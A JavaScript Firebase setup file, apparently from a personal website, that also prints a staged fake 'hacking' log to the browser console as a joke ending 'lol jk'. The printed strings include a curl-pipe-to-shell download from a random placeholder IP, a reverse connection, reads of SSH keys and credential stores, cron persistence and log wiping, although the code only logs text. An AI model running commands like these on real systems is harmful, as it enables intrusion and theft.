import { initializeApp } from "firebase/app";
import { getAnalytics, logEvent } from "firebase/analytics";
import { getFirestore } from "firebase/firestore";

// Make sure these match EXACTLY with your Firebase project settings
const firebaseConfig = {
  apiKey: import.meta.env.VITE_FIREBASE_API_KEY,
  authDomain: import.meta.env.VITE_FIREBASE_AUTH_DOMAIN,
  projectId: import.meta.env.VITE_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_FIREBASE_APP_ID,
  measurementId: import.meta.env.VITE_FIREBASE_MEASUREMENT_ID
};

// Check if Firebase is configured
const isFirebaseConfigured = firebaseConfig.projectId && firebaseConfig.apiKey;

// Initialize Firebase only if configured
let app = null;
let analytics = null;
let db = null;

// Developer greeting with delayed sequence
const devGreeting = () => {
  const randomIP = () => `${Math.floor(Math.random()*223)+1}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*254)+1}`;
  const randomHex = () => Math.random().toString(16).substr(2, 8);
  const randomMAC = () => Array(6).fill(0).map(() => Math.floor(Math.random()*256).toString(16).padStart(2,'0')).join(':');
  const ts = () => {
    const d = new Date();
    return d.toLocaleString('en-US', { month: 'short', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).replace(',', '');
  };
  const pid = Math.floor(Math.random()*50000)+1000;
  const uid = Math.floor(Math.random()*1000)+500;
  const attackerIP = randomIP();
  const c2IP = randomIP();
  
  // Real browser/system info for extra scare factor
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const lang = navigator.language;
  const cores = navigator.hardwareConcurrency || 'unknown';
  const memory = navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown';
  const screen = window.screen.width + 'x' + window.screen.height;
  const colorDepth = window.screen.colorDepth + '-bit';
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const cookieCount = document.cookie ? document.cookie.split(';').length : 0;
  const localStorageSize = Object.keys(localStorage).length;
  const online = navigator.onLine ? 'connected' : 'offline';
  const connection = navigator.connection ? navigator.connection.effectiveType : '4g';
  
  // Get GPU info via WebGL
  let gpu = 'unknown';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch(e) {}
  
  const s = 'color: #ff6b6b; font-family: "SF Mono", "Monaco", "Inconsolata", "Fira Mono", "Droid Sans Mono", monospace; font-size: 10px; line-height: 1.4;';
  const warn = 'color: #ffa500; font-family: "SF Mono", "Monaco", "Inconsolata", "Fira Mono", "Droid Sans Mono", monospace; font-size: 10px; line-height: 1.4;';
  const crit = 'color: #ff3333; font-family: "SF Mono", "Monaco", "Inconsolata", "Fira Mono", "Droid Sans Mono", monospace; font-size: 10px; line-height: 1.4; font-weight: 600;';
  const dim = 'color: #cc9999; font-family: "SF Mono", "Monaco", "Inconsolata", "Fira Mono", "Droid Sans Mono", monospace; font-size: 10px; line-height: 1.4;';
  const prog = 'color: #ff6b6b; font-family: "SF Mono", "Monaco", monospace; font-size: 10px;';
  
  // Message with custom delay multiplier (1 = normal, 0.3 = fast, 2 = slow)
  const messages = [
    [() => ['%c' + ts() + ' kernel: [UFW BLOCK] IN=eth0 OUT= MAC=' + randomMAC() + ' SRC=' + attackerIP + ' DST=10.0.0.1 PROTO=TCP SPT=44231 DPT=22', dim], 0.4],
    [() => ['%c' + ts() + ' kernel: [UFW BLOCK] IN=eth0 OUT= MAC=' + randomMAC() + ' SRC=' + attackerIP + ' DST=10.0.0.1 PROTO=TCP SPT=44232 DPT=22', dim], 0.3],
    [() => ['%c' + ts() + ' kernel: [UFW BLOCK] IN=eth0 OUT= MAC=' + randomMAC() + ' SRC=' + attackerIP + ' DST=10.0.0.1 PROTO=TCP SPT=44235 DPT=22', dim], 0.3],
    [() => ['%c' + ts() + ' sshd[' + pid + ']: Failed password for root from ' + attackerIP + ' port 44238 ssh2', s], 0.8],
    [() => ['%c' + ts() + ' sshd[' + pid + ']: Failed password for root from ' + attackerIP + ' port 44239 ssh2', s], 0.6],
    [() => ['%c' + ts() + ' sshd[' + pid + ']: Failed password for admin from ' + attackerIP + ' port 44240 ssh2', s], 0.6],
    [() => ['%c' + ts() + ' sshd[' + pid + ']: Accepted password for root from ' + attackerIP + ' port 44241 ssh2', crit], 1.5],
    [() => ['%c' + ts() + ' sshd[' + pid + ']: pam_unix(sshd:session): session opened for user root by (uid=0)', s], 0.8],
    [() => ['%c' + ts() + ' sudo: pam_unix(sudo:auth): authentication failure; logname=root uid=' + uid + ' euid=0 tty=/dev/pts/0 ruser=root rhost=  user=root', warn], 1],
    [() => ['%c' + ts() + ' kernel: audit: type=1400 audit(1707091847.892:289): apparmor="DENIED" operation="capable" profile="/usr/sbin/sshd" pid=' + pid + ' comm="sshd" capability=1', s], 0.5],
    [() => ['%c' + ts() + ' systemd[1]: Started Session ' + Math.floor(Math.random()*100) + ' of user root.', dim], 0.7],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: enumerating target system...', s], 1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: platform: ' + platform, crit], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: user-agent: ' + ua, s], 0.4],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: screen: ' + screen + ' (' + colorDepth + ')', s], 0.35],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: cpu cores: ' + cores, s], 0.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: memory: ' + memory, s], 0.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: gpu: ' + gpu, s], 0.4],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: timezone: ' + timezone, crit], 0.35],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: language: ' + lang, s], 0.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: network: ' + online + ' (' + connection + ')', s], 0.35],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: cookies: ' + cookieCount + ' found', crit], 0.4],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: localStorage: ' + localStorageSize + ' entries', s], 0.4],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+1) + ']: fingerprint captured. proceeding...', crit], 1.2],
    [() => ['%c' + ts() + ' sh[' + (pid+1) + ']: curl -fsSL http://' + c2IP + '/bd.sh | sh', crit], 1.2],
    [() => ['%c' + ts() + ' curl[' + (pid+2) + ']: downloading http://' + c2IP + '/bd.sh', s], 0.5],
    [() => ['%c' + ts() + ' curl[' + (pid+2) + ']: [░░░░░░░░░░░░░░░░░░░░] 0% (0/847KB)', prog], 0.2],
    [() => ['%c' + ts() + ' curl[' + (pid+2) + ']: [███░░░░░░░░░░░░░░░░░] 14% (119/847KB)', prog], 0.15],
    [() => ['%c' + ts() + ' curl[' + (pid+2) + ']: [██████░░░░░░░░░░░░░░] 31% (263/847KB)', prog], 0.15],
    [() => ['%c' + ts() + ' curl[' + (pid+2) + ']: [█████████░░░░░░░░░░░] 47% (398/847KB)', prog], 0.12],
    [() => ['%c' + ts() + ' curl[' + (pid+2) + ']: [████████████░░░░░░░░] 58% (491/847KB)', prog], 0.12],
    [() => ['%c' + ts() + ' curl[' + (pid+2) + ']: [███████████████░░░░░] 74% (627/847KB)', prog], 0.1],
    [() => ['%c' + ts() + ' curl[' + (pid+2) + ']: [██████████████████░░] 89% (754/847KB)', prog], 0.1],
    [() => ['%c' + ts() + ' curl[' + (pid+2) + ']: [████████████████████] 100% (847/847KB)', prog], 0.8],
    [() => ['%c' + ts() + ' sh[' + (pid+3) + ']: chmod +x /tmp/.x; /tmp/.x', s], 1],
    [() => ['%c' + ts() + ' kernel: audit: type=1400 audit(1707091851.221:298): apparmor="STATUS" operation="profile_load" profile="unconfined" name="/tmp/.x"', warn], 0.6],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: connecting to ' + c2IP + ':4444...', s], 1.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: connection established, spawning pty', crit], 1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: downloading stage2 payload...', s], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [░░░░░░░░░░░░░░░░░░░░] 0%', prog], 0.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [████░░░░░░░░░░░░░░░░] 22%', prog], 0.25],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [█████████░░░░░░░░░░░] 44%', prog], 0.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [█████████████░░░░░░░] 67%', prog], 0.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [█████████████████░░░] 83%', prog], 0.15],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [████████████████████] 100%', prog], 0.8],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: stage2 loaded (2.3MB)', s], 1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: injecting into process ' + (pid+6) + ' (chrome)', s], 0.9],
    [() => ['%c' + ts() + ' chrome[' + (pid+6) + ']: [' + randomHex() + '] Mojo binding established from unknown source', warn], 0.7],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: reading /home/user/.config/google-chrome/Default/Login\\ Data', s], 1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: sqlite3: extracting credentials...', s], 0.8],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: decrypted 247 credentials via CryptUnprotectData', crit], 1.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: hooking Google OAuth session...', s], 0.9],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: intercepted refresh_token: ya29.a0AfB_by' + randomHex() + '...', crit], 0.7],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: accessing accounts.google.com...', s], 0.6],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: found active sessions: Gmail, Drive, Photos', warn], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: 2FA bypass: SIM swap not required (session hijack)', crit], 0.8],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: installing SMS intercept hook...', s], 0.6],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: monitoring for verification codes...', s], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [INTERCEPT] code: 847291 (from: Google)', crit], 1.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [INTERCEPT] code: 583016 (from: GitHub)', crit], 0.8],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [INTERCEPT] code: 294837 (from: Discord)', crit], 0.6],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: authenticator TOTP seeds extracted (3 accounts)', crit], 1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: reading /home/user/.ssh/id_rsa', crit], 0.9],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: reading /home/user/.ssh/id_ed25519', crit], 0.7],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: found 3 private keys', s], 1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: scanning for cryptocurrency wallets...', s], 1.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: found MetaMask extension data', s], 0.8],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: bruteforcing vault password...', s], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [░░░░░░░░░░] attempting...', prog], 0.4],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [███░░░░░░░] 127,439 attempts', prog], 0.35],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [██████░░░░] 298,102 attempts', prog], 0.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [████████░░] 445,891 attempts', prog], 0.25],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [██████████] password found!', crit], 1.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: vault decrypted, extracting seed phrase', crit], 1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: reading /home/user/Projects/app/.env', s], 0.9],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: found STRIPE_SECRET_KEY=sk_live_*****', crit], 0.7],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: found DATABASE_URL=postgres://prod:*****@db.example.com', crit], 0.6],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: found AWS_SECRET_ACCESS_KEY=*****', crit], 0.6],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: compressing exfil archive...', s], 0.8],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']:   + fingerprint.json (' + platform + ', ' + screen + ', ' + timezone + ')', dim], 0.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']:   + browser_creds.db (247 entries)', dim], 0.25],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']:   + cookies.sqlite (' + cookieCount + ' cookies)', dim], 0.25],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']:   + localStorage.json (' + localStorageSize + ' keys)', dim], 0.25],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']:   + ssh_keys/ (3 files)', dim], 0.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']:   + wallet_seed.txt', dim], 0.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']:   + env_secrets.txt', dim], 0.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [░░░░░░░░░░░░░░░░░░░░] 0% (0/23.7MB)', prog], 0.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [█████░░░░░░░░░░░░░░░] 24% (5.7/23.7MB)', prog], 0.18],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [██████████░░░░░░░░░░] 51% (12.1/23.7MB)', prog], 0.15],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [███████████████░░░░░] 78% (18.5/23.7MB)', prog], 0.12],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [████████████████████] 100% (23.7/23.7MB)', prog], 0.7],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: uploading to ' + c2IP + ':443/drop', s], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [░░░░░░░░░░░░░░░░░░░░] 0%   ↑ 0KB/s', prog], 0.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [███░░░░░░░░░░░░░░░░░] 17%  ↑ 847KB/s', prog], 0.25],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [███████░░░░░░░░░░░░░] 38%  ↑ 1.2MB/s', prog], 0.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [███████████░░░░░░░░░] 54%  ↑ 1.4MB/s', prog], 0.18],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [███████████████░░░░░] 73%  ↑ 1.1MB/s', prog], 0.15],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [██████████████████░░] 91%  ↑ 980KB/s', prog], 0.12],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [████████████████████] 100% complete', prog], 1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: upload complete (14.2s)', s], 1.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: installing persistence...', s], 1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: added to /etc/crontab: @reboot /var/tmp/.cache/upd >/dev/null 2>&1', s], 0.8],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: created /etc/systemd/system/systemd-helper.service', s], 0.7],
    [() => ['%c' + ts() + ' systemd[1]: systemd-helper.service: Succeeded.', dim], 0.9],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: keylogger thread started', s], 0.6],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: clipboard monitor started', s], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: screencap interval: 30s', s], 0.7],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: starting file encryption (AES-256-GCM)...', s], 1.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: encrypting /home/user/Documents...', s], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [░░░░░░░░░░] 0/1847 files', prog], 0.15],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [███░░░░░░░] 412/1847 files', prog], 0.12],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [██████░░░░] 891/1847 files', prog], 0.1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [█████████░] 1502/1847 files', prog], 0.1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [██████████] 1847/1847 files', prog], 0.6],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: encrypting /home/user/Pictures...', s], 0.4],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [██████████] 943/943 files', prog], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: encrypting /home/user/Desktop...', s], 0.4],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: [██████████] 127/127 files', prog], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: total: 2,917 files encrypted', crit], 1.2],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: ransom note written to /home/user/Desktop/README.txt', crit], 1],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: wiping logs...', dim], 0.8],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: > /var/log/auth.log', dim], 0.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: > /var/log/syslog', dim], 0.3],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: history -c && rm ~/.bash_history', dim], 0.4],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: shred -u /tmp/.x', dim], 0.5],
    [() => ['%c' + ts() + ' /tmp/.x[' + (pid+4) + ']: done. exiting.', s], 1.5],
    [() => ['%c ', ''], 1],
    [() => ['%c ', ''], 8],
    [() => ['%clol jk', 'color: #55ff55; font-family: "SF Mono", Monaco, monospace; font-size: 14px; font-weight: bold;'], 1],
    [() => ['%cnice inspect element skills :)', 'color: #aaa; font-family: "SF Mono", Monaco, monospace; font-size: 11px;'], 0.8],
    [() => ['%cverify this site is safe: https://github.com/lyeric2022/lyyeric.tech', 'color: #888; font-family: "SF Mono", Monaco, monospace; font-size: 10px;'], 0.6],
    [() => ['%c- eric', 'color: #777; font-family: "SF Mono", Monaco, monospace; font-size: 10px;'], 1],
  ];

  const baseDelay = 600;
  let totalDelay = 0;
  
  messages.forEach(([msgFn, multiplier]) => {
    const delay = baseDelay * multiplier;
    totalDelay += delay;
    setTimeout(() => {
      const msg = msgFn();
      console.log(msg[0], msg[1]);
    }, totalDelay);
  });
};

if (isFirebaseConfigured) {
  try {
    app = initializeApp(firebaseConfig);
    analytics = getAnalytics(app);
    db = getFirestore(app);
    devGreeting();
  } catch (error) {
    // Silent fail in production
  }
} else {
  devGreeting();
}

// Helper function to log events (no-op if Firebase not configured)
export const logAnalyticsEvent = (eventName, eventParams = {}) => {
  if (analytics) {
  logEvent(analytics, eventName, eventParams);
  }
};

export { analytics, db };
export default app;